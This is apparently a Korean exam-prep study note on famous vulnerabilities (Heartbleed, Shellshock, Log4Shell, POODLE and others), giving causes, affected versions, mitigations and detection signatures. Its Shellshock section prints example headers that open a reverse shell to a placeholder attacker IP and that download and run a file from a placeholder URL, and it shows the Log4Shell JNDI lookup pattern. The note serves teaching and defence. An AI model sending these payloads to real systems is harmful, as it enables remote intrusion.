---
title: 주요 취약점 (HeartBleed · Shellshock · Log4Shell · POODLE)
domain: 애플리케이션보안
questions: [3-2, 4-1, 5-2, 7-16, 8-14, 15-7, 23-10, 24-12, 26-18, 29-8, 32-7]
tags: [HeartBleed, Shellshock, Log4j, POODLE, CVE, OpenSSL]
---

## 한 줄 정의

이름 붙은 대형 취약점은 **"무엇을 · 왜 · 어떤 버전 · 어떻게 막나"** 의 4칸으로 외운다. 시험은 취약점 이름 ↔ 원리 매칭과, 로그·헤더에서 *어떤 공격인지* 알아보는 형태가 많다. {{3-2}} {{4-1}} {{5-2}} {{15-7}} {{23-10}} {{29-8}}

## 1. 식별자 — CVE

`CVE-2014-0160` = `CVE` - `발견/공개 연도` - `그 해 일련번호`. MITRE 가 채번하고 NVD 가 CVSS 점수를 부여한다.

| 관련 표준 | 의미 |
|---|---|
| **CWE** | 약점 유형 분류 |
| **CVSS** | 심각도 0~10점 |
| **CPE** | 제품 식별 |

## 2. 대표 취약점 4종

### HeartBleed — CVE-2014-0160

- **OpenSSL** TLS/DTLS **heartbeat 확장**이 요청이 명시한 payload 길이를 **검증 없이** 응답 버퍼 크기로 사용
- → 서버 메모리를 **최대 64KB 씩 반복 열람** → 개인키 · 세션쿠키 · 평문 비밀번호 유출
- 영향: **OpenSSL 1.0.1 ~ 1.0.1f** (1.0.2-beta 포함)
- 대응: **1.0.1g 이상** 업그레이드 (불가 시 `-DOPENSSL_NO_HEARTBEATS` 재컴파일) + **인증서·개인키 재발급** + 사용자 세션·비밀번호 재설정
- 탐지: `content:"|18 03 00|"` (heartbeat, SSLv3) + 비정상적으로 큰 길이 필드

### Shellshock (Bashdoor) — CVE-2014-6271 {{29-8}}

- **Bash** 가 환경변수의 함수 정의(`() { :;};`) **뒤에 붙은 명령까지 실행**
- CGI 가 요청 헤더(User-Agent · Referer)를 환경변수로 넘기는 점을 악용 → **리버스 셸** 또는 **웹셸 파일 생성**
- 로그 예: `"GET /cgi-bin/websrc HTTP/1.1" 301 ... "() { :;}; ... b.php"` → `b.php` 웹셸 업로드 시도
- 대응: Bash 패치 · mod_cgi 비활성 · WAF (`() {` 패턴 차단)

```text
User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/[공격자IP]/[Port] 0>&1                    # 리버스 셸
Accept-Encoding: () { :; }; /bin/bash -c 'wget -O /tmp/x http://악성URL; chmod 777 /tmp/x; /tmp/x'  # 다운로드·실행
```

> [!암기] 공통 패턴
> `() { :; };` (빈 함수 정의)로 Bash 파서를 속인 뒤 **`;` 뒤에 진짜 명령**을 붙인다.

### Log4Shell — CVE-2021-44228

- **Apache Log4j 2** 가 로그 메시지의 `${jndi:ldap://공격자/...}` 를 해석해 **원격 객체를 로드·실행**
- **로그로 남는 곳이면 어디서든** 발동 (User-Agent · 검색어 · 채팅…)
- 대응: **2.17.1+** 업그레이드 · `JndiLookup` 클래스 제거 · 아웃바운드 LDAP/RMI 차단 · WAF

### POODLE — CVE-2014-3566

- 협상을 **SSL 3.0 으로 다운그레이드**한 뒤 CBC **패딩 오라클**로 암호문 바이트를 하나씩 복호화
- 대응: **SSL 3.0 비활성** · `TLS_FALLBACK_SCSV`
- 관련 CBC 공격: BEAST · Lucky13

## 3. 기타 유명 취약점 (단답 대비)

| 이름 | 대상 / 원리 | 대응 |
|---|---|---|
| **DROWN** | SSLv2 를 지원하면 TLS 세션도 복호화 | SSLv2 완전 비활성 |
| **FREAK / Logjam** | export 급 약한 키(RSA 512 / DH 512)로 다운그레이드 | 약한 암호군 제거 |
| **BEAST / CRIME / BREACH** | TLS 1.0 CBC / 압축을 이용한 평문 추측 | TLS 1.2+ · 압축 비활성 |
| **EternalBlue** (MS17-010) | Windows **SMBv1** 원격 코드 실행 (WannaCry · NotPetya) | 패치 · SMBv1 비활성 · 445 차단 |
| **ProxyLogon / ProxyShell** | MS Exchange 인증 우회 → 웹셸 | 누적 업데이트 |
| **Dirty COW** (CVE-2016-5195) | 리눅스 커널 copy-on-write 경쟁 조건 → 로컬 권한 상승 | 커널 패치 |
| **Struts2 OGNL** (CVE-2017-5638) | Content-Type 헤더의 OGNL 식 평가 → RCE (에퀴팩스 유출) | Struts 업그레이드 |
| **Spring4Shell** (CVE-2022-22965) | Spring `ClassLoader` 바인딩 조작 → RCE | Spring 5.3.18+ |
| **Meltdown / Spectre** | CPU 투기적 실행 → 커널 메모리 유출 | 마이크로코드·OS 패치 (성능 저하) |
| **GHOST** (CVE-2015-0235) | glibc `gethostbyname` 버퍼 오버플로 | glibc 패치 |

## 4. 공통 대응 원칙

1. **패치 관리 절차**: 인지 → 영향 분석 → **테스트 환경 검증** → 배포 → 적용 확인 → 롤백 계획
2. 즉시 패치 불가 시 **가상 패치**(WAF·IPS 시그니처)로 시간 확보
3. CVE·보안공지 모니터링(KISA·벤더) · 자산 인벤토리로 노출 파악 · **EOS(지원종료) SW 교체**
4. 인터넷 노출 최소화 · 최소 권한 · 로깅·탐지

## 기출 포인트

> [!시험] 이렇게 나온다
> HeartBleed 의 원리(길이 미검증)와 대응(1.0.1g + 키 재발급) · Shellshock 로그/헤더 패턴 · Log4Shell 의 `${jndi:...}` · POODLE 의 다운그레이드 · CVE 번호 구조
